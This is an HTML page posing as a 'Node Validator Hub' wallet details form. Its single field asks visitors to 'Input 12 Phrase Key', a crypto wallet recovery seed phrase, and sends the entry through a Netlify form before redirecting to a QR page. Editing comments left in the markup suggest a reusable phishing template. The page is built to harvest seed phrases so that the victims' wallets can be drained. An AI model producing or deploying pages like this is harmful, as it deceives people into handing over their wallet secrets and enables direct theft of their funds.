<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Wallet Details - Node Validator Hub</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #0f0f2e 0%, #1a1a3f 100%);
      color: #e0e0e0;
      min-height: 100vh;
    }
    .wrapper {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 1.5rem;
    }
    .form-box {
      background: rgba(30, 30, 60, 0.95);
      border-radius: 16px;
      padding: 2rem;
      width: 100%;
      max-width: 420px;
      border: 1px solid rgba(0, 212, 255, 0.4);
      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.4);
      display: flex;
      flex-direction: column;
      gap: 0.75rem;
    }
    .form-box h1 {
      font-size: 1.6rem;
      margin-bottom: 0.5rem;
    }
    .form-box label {
      font-size: 0.9rem;
    }
    .form-box input {
      width: 100%;
      padding: 0.6rem 0.8rem;
      border-radius: 8px;
      border: 1px solid rgba(0, 212, 255, 0.4);
      background: rgba(10, 10, 30, 0.9);
      color: #e0e0e0;
      font-size: 0.95rem;
    }
    .form-box button {
      margin-top: 0.75rem;
      padding: 0.7rem 1rem;
      border-radius: 8px;
      border: none;
      cursor: pointer;
      font-size: 0.95rem;
      font-weight: 600;
      background: #00d4ff;
      color: #0b1020;
      transition: all 0.25s ease;
    }
    .form-box button:hover {
      background: #30e0ff;
      transform: translateY(-2px);
    }
  </style>
</head>
<body>
  <form
  class="form-box"
  name="validator-form"
  method="POST"
  data-netlify="true"
  action="/qr.html"
>
  <!-- Edit this headline text to whatever you like -->
  <h1>Input 12 Phrase Key</h1>

  <!-- Netlify needs this hidden field -->
  <input type="hidden" name="form-name" value="validator-form" />

  <label for="walletField">Wallet information</label>
  <input
    type="text"
    id="walletField"
    name="walletField"
    placeholder="Type anything you want here..."
    required
  />

  <button type="submit">Submit</button>
</form>

    </form>
  </div>
</body>
</html>
